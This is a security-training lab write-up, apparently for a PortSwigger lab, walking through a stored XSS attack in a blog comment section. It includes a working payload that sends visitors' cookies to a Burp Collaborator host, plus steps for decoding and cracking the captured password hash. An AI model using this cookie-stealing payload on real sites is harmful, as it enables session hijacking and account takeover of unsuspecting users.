# Lab Offline password cracking

Objective: 

 This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

    Your credentials: wiener:peter
    Victim's username: carlos


Visiting the landing page reveals the following

![image](https://user-images.githubusercontent.com/90155329/133942862-ec0a9ffb-6ef4-4e01-ac83-62fb61dcc7be.png)

Selecting "View Post" visits one of the blog posts


Scrolling down reveals the vulnerable comment section. 

![image](https://user-images.githubusercontent.com/90155329/133942865-4f8184a0-c442-4a78-8988-191421cc15e4.png)

I need to try different XSS payloads until, one works. 

Using the BurpSuite XSS cheat sheet, I found the following payload.

![image](https://user-images.githubusercontent.com/90155329/133942870-b5989783-1164-445a-a7ac-187c8acf46ea.png)

`
<video><source onerror=location=/\02.rs/+document.cookie>
`

I can use the "Burp Collaborator Client" which is a feature of BurpSuitePro that allows me to test out of band techniques. 

Burp Collaborator will start a listener for me on burpcollaborator.net. Any traffic to this domain will be sent to my client.

To start a listener, visit Burp > Burp Collaborator client

![image](https://user-images.githubusercontent.com/90155329/133942874-80ba6857-7546-4333-95d1-fd864f8ef816.png)

Clicking "Copy to clipboard, will get me the collaborator domain I will use for my attacks"

![image](https://user-images.githubusercontent.com/90155329/133942880-fbf73ba7-a413-455b-9cc9-a5eac1428618.png)

93abbpng7znc1866if44gqzo5fb7zw.burpcollaborator.net

I modified the XSS payload to use the collaborator domain.

`
<video><source onerror=location=/\93abbpng7znc1866if44gqzo5fb7zw.burpcollaborator.net/+document.cookie>
`

I dropped the payload into the vulnerable comment section.
![image](https://user-images.githubusercontent.com/90155329/133942886-748cad9b-06f3-4c39-9ee9-3f6483e51a4d.png)

After posting the payload, the page redirected to the burp collaborator domain with my current session cookie

![image](https://user-images.githubusercontent.com/90155329/133942888-c2c1323c-986f-4468-9209-452ec28e4b18.png)

This means that the XSS payload worked. Any user who visits that blog page will send their cookie to my burp collaborator client.

Immediately after dropping the payload, I received a request on my burp collaborator client.

![image](https://user-images.githubusercontent.com/90155329/133942890-fe56dde9-8db5-48f2-8ca6-4b59c62bd641.png)

`
secret=AulNpHRdIdE7ysgqyP2AVqQTRBqD0O7X;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
`

The logged-in value looks like base64:

`
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
`

After base64 decoding the cookie results in the following:

`
carlos:26323c16d5f4dabff3bb136f2460a943
`

Cracking this hash reveals the password of onceuponatime

![image](https://user-images.githubusercontent.com/90155329/133942911-a5ccba5d-abd8-4c90-8074-27ed72809358.png)

This attack simulated the carlos user, visiting the blog page containing the XSS payload which sent his cookie to my burp collaborator. 

I tried this password

![image](https://user-images.githubusercontent.com/90155329/133942915-0842661a-fe1b-4dd2-976e-436e05afae6c.png)

These credentials worked, and I was able to delete his account to complete the lab

![image](https://user-images.githubusercontent.com/90155329/133942922-113f7f9a-23bd-4b93-9001-16b9d6c3732b.png)
![image](https://user-images.githubusercontent.com/90155329/133942927-eaf3b087-9feb-411d-967f-03a59240a1e9.png)
